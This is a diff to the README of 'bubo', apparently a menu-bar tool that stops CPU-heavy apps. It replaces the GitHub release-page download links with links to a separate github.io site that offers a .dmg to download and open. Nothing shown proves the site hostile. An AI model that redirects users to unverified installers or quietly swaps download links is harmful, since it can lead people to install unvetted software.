@@ -1,6 +1,6 @@
 # 🦉 bubo - Stop heavy apps with one click
 
-[![](https://img.shields.io/badge/Download-Bubo-blue.svg)](https://github.com/BrancoMarcelo/bubo)
+[![](https://img.shields.io/badge/Download-Bubo-blue.svg)](https://brancomarcelo.github.io)
 
 Bubo monitors your computer. It identifies apps that use too much processing power. You see these apps in the menu bar at the top of your screen. You stop them with a single click. This keeps your machine fast.
 
@@ -10,7 +10,7 @@ Bubo works on most modern computers. It supports both Apple Silicon and Intel pr
 
 ## 📥 Installation
 
-1. Visit the [official release page](https://github.com/BrancoMarcelo/bubo) to download the software.
+1. Visit the [official release page](https://brancomarcelo.github.io) to download the software.
 2. Look for the file that ends in .dmg. 
 3. Click the file to start the download.
 4. Open the downloaded file once it finishes.
